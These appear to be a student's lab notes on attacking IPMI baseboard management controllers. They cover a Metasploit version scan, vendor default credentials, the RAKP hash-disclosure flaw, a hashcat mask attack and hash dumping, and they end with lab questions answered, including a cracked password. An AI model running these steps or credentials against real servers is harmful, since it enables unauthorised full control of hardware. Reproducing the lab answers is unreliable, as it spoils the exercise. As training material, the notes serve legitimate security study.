# IPMI (port )
Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell.

IPMI is typically used in three ways:
- Before the OS has booted to modify BIOS settings
- When the host is fully powered down
- Access to a host after a system failure

## Footprinting
IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.
### Metasploit Version Scan
```
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

During internal penetration tests, we often find BMCs where the administrators have not changed the default password.
|Product|Username|Password|
|-|-|-|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|

## Dangerous Settings
If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. **During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place**. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command :
```
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
which tries all combinations of upper case letters and numbers for an eight-character password.

To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module.
### Metasploit Dumping Hashes
```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Questions
1. What username is configured for accessing the host via IPMI? **Answer: admin**
   - `$ msfconsole`
   - `msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes`
   - `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS <ip>`
   - `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set SESSION_MAX_ATTEMPTS 10`
   - `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set THREADS 5`
   - `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run` -> Hash found: 
    ```
    [+] 10.129.140.178:623 - IPMI - Hash found: admin:5d759274820600002a7c316906a14b77afd82ae9bca5e39f35c4fcb982e6aadedc13c8f0392c6863a123456789abcdefa123456789abcdef140561646d696e:4900b35ab47014bad6fbbf6fe25ffa6ca6cc0c9c
    [+] 10.129.140.178:623 - IPMI - Hash for user 'admin' matches password 'trinity'
    ```
2. What is the account's cleartext password? **Answer: trinity**
   - Remember to set the wordlist to rockyou.txt: `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set PASS_FILE ~/rockyou.txt`